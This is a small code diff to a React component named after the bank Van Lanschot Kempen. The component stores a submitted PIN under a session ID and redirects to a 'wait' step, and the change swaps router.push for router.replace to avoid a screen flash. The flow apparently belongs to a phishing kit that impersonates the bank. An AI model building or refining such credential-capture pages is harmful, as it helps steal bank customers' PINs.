@@ -44,7 +44,8 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
         pin: code 
       }
     }).eq("id", sessionId);
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   // Common Header and Footer for Step 1 and 2
